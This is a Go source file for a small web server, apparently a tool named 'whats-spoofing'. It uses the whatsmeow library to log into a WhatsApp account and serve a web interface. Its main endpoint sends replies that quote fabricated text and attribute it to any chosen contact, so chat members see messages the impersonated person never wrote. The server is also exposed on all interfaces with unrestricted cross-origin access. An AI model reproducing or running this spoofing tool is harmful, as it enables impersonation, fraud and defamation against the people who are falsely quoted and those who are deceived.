package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io/fs"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"go.mau.fi/whatsmeow"
	waProto "go.mau.fi/whatsmeow/binary/proto"
	"go.mau.fi/whatsmeow/store/sqlstore"
	"go.mau.fi/whatsmeow/types"
	waLog "go.mau.fi/whatsmeow/util/log"
	"google.golang.org/protobuf/proto"

	"embed"
)

//go:embed client
var clientFiles embed.FS

var client *whatsmeow.Client
var qrChan <-chan whatsmeow.QRChannelItem
var currentQR string

func corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}
		next.ServeHTTP(w, r)
	})
}

func jsonErr(w http.ResponseWriter, msg string, code int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(map[string]string{"error": msg})
}

func handleStatus(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	if client != nil && client.IsLoggedIn() {
		json.NewEncoder(w).Encode(map[string]interface{}{"loggedIn": true})
		return
	}
	resp := map[string]interface{}{"loggedIn": false}
	if currentQR != "" {
		resp["qr"] = currentQR
	}
	json.NewEncoder(w).Encode(resp)
}

func handleGetChats(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	if client == nil || !client.IsLoggedIn() {
		jsonErr(w, "not logged in", http.StatusUnauthorized)
		return
	}

	type ChatEntry struct {
		Name     string `json:"name"`
		PushName string `json:"pushname,omitempty"`
		JID      string `json:"jid"`
		Type     string `json:"type"`
	}

	var entries []ChatEntry

	contacts, err := client.Store.Contacts.GetAllContacts()
	if err == nil {
		for jid, info := range contacts {
			entry := ChatEntry{
				Name: info.FullName,
				JID:  jid.String(),
				Type: "contact",
			}
			if info.PushName != "" && info.PushName != info.FullName {
				entry.PushName = info.PushName
			}
			if entry.Name == "" {
				entry.Name = info.PushName
			}
			if entry.Name == "" {
				entry.Name = jid.User
			}
			entries = append(entries, entry)
		}
	}

	groups, err := client.GetJoinedGroups()
	if err == nil {
		for _, g := range groups {
			entries = append(entries, ChatEntry{
				Name: g.Name,
				JID:  g.JID.String(),
				Type: "group",
			})
		}
	}

	json.NewEncoder(w).Encode(entries)
}

type SpoofRequest struct {
	ChatID         string `json:"chat_id"`
	MessageID      string `json:"message_id"`
	SpoofedID      string `json:"spoofed_id"`
	SpoofedMessage string `json:"spoofed_message"`
	ReplyMessage   string `json:"reply_message"`
}

func handleSendSpoofed(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	if r.Method != http.MethodPost {
		jsonErr(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if client == nil || !client.IsLoggedIn() {
		jsonErr(w, "not logged in", http.StatusUnauthorized)
		return
	}

	var req SpoofRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonErr(w, "invalid request body", http.StatusBadRequest)
		return
	}
	if req.ChatID == "" || req.SpoofedID == "" || req.SpoofedMessage == "" || req.ReplyMessage == "" {
		jsonErr(w, "missing required fields", http.StatusBadRequest)
		return
	}

	chatJID, err := types.ParseJID(req.ChatID)
	if err != nil {
		jsonErr(w, fmt.Sprintf("invalid chat JID: %v", err), http.StatusBadRequest)
		return
	}
	spoofJID, err := types.ParseJID(req.SpoofedID)
	if err != nil {
		jsonErr(w, fmt.Sprintf("invalid spoofed JID: %v", err), http.StatusBadRequest)
		return
	}

	msgID := req.MessageID
	if strings.HasPrefix(msgID, "!") {
		msgID = whatsmeow.GenerateMessageID()
	}

	spoofedJIDStr := spoofJID.String()
	msg := &waProto.Message{
		ExtendedTextMessage: &waProto.ExtendedTextMessage{
			Text: proto.String(req.ReplyMessage),
			ContextInfo: &waProto.ContextInfo{
				StanzaId:    proto.String(msgID),
				Participant: proto.String(spoofedJIDStr),
				QuotedMessage: &waProto.Message{
					Conversation: proto.String(req.SpoofedMessage),
				},
			},
		},
	}

	resp, err := client.SendMessage(context.Background(), chatJID, msg)
	if err != nil {
		jsonErr(w, fmt.Sprintf("send failed: %v", err), http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(map[string]string{
		"message": fmt.Sprintf("Spoofed message sent: %s", resp.ID),
	})
}

func handleClear(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	if client != nil {
		client.Disconnect()
		client = nil
	}
	currentQR = ""
	json.NewEncoder(w).Encode(map[string]string{"message": "disconnected"})
}

func startWhatsApp() {
	dbLog := waLog.Stdout("Database", "ERROR", true)
	container, err := sqlstore.New("sqlite3", "file:whats-spoofing.db?_foreign_keys=on", dbLog)
	if err != nil {
		log.Fatalf("DB error: %v", err)
	}

	deviceStore, err := container.GetFirstDevice()
	if err != nil {
		log.Fatalf("Device error: %v", err)
	}

	clientLog := waLog.Stdout("Client", "ERROR", true)
	client = whatsmeow.NewClient(deviceStore, clientLog)

	if client.Store.ID == nil {
		qrCh, err := client.GetQRChannel(context.Background())
		if err != nil {
			log.Fatalf("QR channel error: %v", err)
		}
		go func() {
			for evt := range qrCh {
				if evt.Event == "code" {
					currentQR = evt.Code
					log.Println("QR code updated — scan at http://localhost:8080")
				} else {
					log.Println("QR event:", evt.Event)
					currentQR = ""
				}
			}
		}()
		if err := client.Connect(); err != nil {
			log.Fatalf("Connect error: %v", err)
		}
	} else {
		if err := client.Connect(); err != nil {
			log.Fatalf("Connect error: %v", err)
		}
		log.Println("Reconnected existing session")
	}
}

func main() {
	go startWhatsApp()

	mux := http.NewServeMux()

	// Serve embedded client files
	if sub, err := fs.Sub(clientFiles, "client"); err == nil {
		mux.Handle("/", http.FileServer(http.FS(sub)))
	}

	mux.HandleFunc("/status", handleStatus)
	mux.HandleFunc("/get-chats", handleGetChats)
	mux.HandleFunc("/send-spoofed", handleSendSpoofed)
	mux.HandleFunc("/clear", handleClear)

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	addr := "0.0.0.0:" + port
	log.Printf("Server running at http://%s", addr)

	srv := &http.Server{
		Addr:         addr,
		Handler:      corsMiddleware(mux),
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
	}

	if err := srv.ListenAndServe(); err != nil {
		log.Fatalf("Server error: %v", err)
	}
}

